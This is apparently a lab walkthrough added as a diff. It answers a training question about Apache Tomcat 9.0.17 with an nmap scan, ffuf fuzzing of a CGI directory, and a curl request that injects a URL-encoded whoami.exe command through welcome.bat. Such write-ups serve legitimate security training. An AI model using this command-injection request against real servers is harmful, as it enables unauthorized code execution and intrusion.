@@ -1,1 +1,63 @@
+Question 1 - After running the URL Encoded 'whoami' payload, what user is tomcat running as?
 
+1) run nmap scan fro msection -> 
+nmap -p- -sC -Pn 10.129.205.30 --open
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-30 15:22 BST
+Stats: 0:00:53 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 69.35% done; ETC: 15:23 (0:00:23 remaining)
+Nmap scan report for 10.129.205.30
+Host is up (0.036s latency).
+Not shown: 59487 closed tcp ports (conn-refused), 6035 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE
+22/tcp    open  ssh
+| ssh-hostkey: 
+|   2048 ae:19:ae:07:ef:79:b7:90:5f:1a:7b:8d:42:d5:60:99 (RSA)
+|   256 38:2e:76:cd:05:94:a6:e7:17:d1:80:81:65:26:25:44 (ECDSA)
+|_  256 35:09:69:12:23:0f:11:bc:54:6f:dd:f7:97:bd:61:50 (ED25519)
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+5985/tcp  open  wsman
+8009/tcp  open  ajp13
+| ajp-methods: 
+|_  Supported methods: GET HEAD POST OPTIONS
+8080/tcp  open  http-proxy
+|_http-title: Apache Tomcat/9.0.17
+|_http-favicon: Apache Tomcat
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+49669/tcp open  unknown
+
+2) ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.205.30:8080/cgi/FUZZ.bat
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.4.1-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.129.205.30:8080/cgi/FUZZ.bat
+ :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+________________________________________________
+
+welcome                 [Status: 200, Size: 81, Words: 14, Lines: 2, Duration: 99ms]
+:: Progress: [4614/4614] :: Job [1/1] :: 3145 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
+
+3) curl 'http://10.129.205.30:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe'
+
+output: feldspar\omen
